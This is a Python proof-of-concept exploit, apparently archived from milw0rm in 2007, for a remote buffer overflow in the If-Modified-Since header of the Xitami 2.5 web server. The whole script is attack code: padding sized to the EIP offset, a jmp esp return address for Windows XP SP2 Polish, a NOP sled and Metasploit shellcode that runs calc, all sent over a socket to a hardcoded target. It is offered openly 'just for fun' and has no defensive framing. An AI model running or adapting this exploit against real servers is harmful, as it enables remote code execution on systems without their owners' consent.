#!/usr/bin/python
# Xitami Web Server 2.5 (If-Modified-Since) 0day Remote Buffer Overflow Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on: Xitami 2.5c2 / XP SP2 Polish
# Shellcode: Windows Execute Command (calc) <metasploit.com>
# Details:..
#
#     [Module xigui32.exe]
#     If-Modified-Since: Evil, ["A" * 76]\r\n
#     EIP 41414141
#
#     [Module xitami.exe]
#     If-Modified-Since: Evil, ["A" * 104]\r\n
#     EIP 41414141
#
# Product Homepage: http://www.xitami.com/
# Just for fun  ;) 
##

from struct import pack
from time import sleep
from socket import *

host = "192.168.0.1"
port = 80

shellcode = (
"\x6a\x22\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8d\x6c\xf6"
"\xb2\x83\xeb\xfc\xe2\xf4\x71\x84\xb2\xb2\x8d\x6c\x7d\xf7\xb1\xe7"
"\x8a\xb7\xf5\x6d\x19\x39\xc2\x74\x7d\xed\xad\x6d\x1d\xfb\x06\x58"
"\x7d\xb3\x63\x5d\x36\x2b\x21\xe8\x36\xc6\x8a\xad\x3c\xbf\x8c\xae"
"\x1d\x46\xb6\x38\xd2\xb6\xf8\x89\x7d\xed\xa9\x6d\x1d\xd4\x06\x60"
"\xbd\x39\xd2\x70\xf7\x59\x06\x70\x7d\xb3\x66\xe5\xaa\x96\x89\xaf"
"\xc7\x72\xe9\xe7\xb6\x82\x08\xac\x8e\xbe\x06\x2c\xfa\x39\xfd\x70"
"\x5b\x39\xe5\x64\x1d\xbb\x06\xec\x46\xb2\x8d\x6c\x7d\xda\xb1\x33"
"\xc7\x44\xed\x3a\x7f\x4a\x0e\xac\x8d\xe2\xe5\x9c\x7c\xb6\xd2\x04"
"\x6e\x4c\x07\x62\xa1\x4d\x6a\x0f\x97\xde\xee\x6c\xf6\xb2")

opcode = pack("<L", 0x7CA76981) # jmp esp (shell32.dll / XP SP2 Polish)
jmpcode = "\xeb\x22"            # jmp short +0x22

buf = "A" * 72                  # (76 - 4) xigui32.exe
buf += opcode
buf += jmpcode
buf += "\x90" * 128
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: Evil, %s\r\n'
'\r\n') % (host, buf)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
s.send(header)
sleep(1)
s.close()

print "DONE"

# EoF

# milw0rm.com [2007-09-24]
